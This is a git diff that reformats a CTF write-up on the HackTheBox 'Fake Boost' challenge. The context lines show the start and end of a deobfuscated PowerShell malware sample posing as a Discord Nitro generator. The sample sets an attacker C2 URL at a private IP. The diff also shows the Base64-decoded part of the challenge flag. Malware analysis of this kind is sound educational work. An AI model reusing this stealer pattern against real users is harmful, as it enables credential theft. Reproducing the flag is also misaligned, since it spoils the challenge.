@@ -32,14 +32,9 @@ Obfuscated Payload -> Reverse -> Decode Base64 -> Invoke Expression (Execute Com
 
 If you're on Windows you can delete last line and just echo the Base64 decoded variable.
 
-[Cyberchef Recipe](2024-03-14-Fake-Boost.md)
-
 ![fake-boost-2](/assets/ctf/htb/fake-boost-2.png)
 
-<details>
-
-<summary>deobfuscated.ps1</summary>
-
+::: details deobfuscated.ps1
 ```powershell
 $URL = "http://192.168.116.135:8080/rj1893rj1joijdkajwda"
 
@@ -218,8 +213,7 @@ Write-Host "Success! Discord Nitro Keys:"
 $keys = GenerateDiscordNitroCodes -numberOfCodes 5 -codeLength 16
 $keys | ForEach-Object { Write-Output $_ }
 ```
-
-</details>
+:::
 
 `$part1 = "SFRCe2ZyMzNfTjE3cjBHM25fM3hwMDUzZCFf"` -> Base64 Decode -> `HTB{fr33_N17r0G3n_3xp053d!_`
 
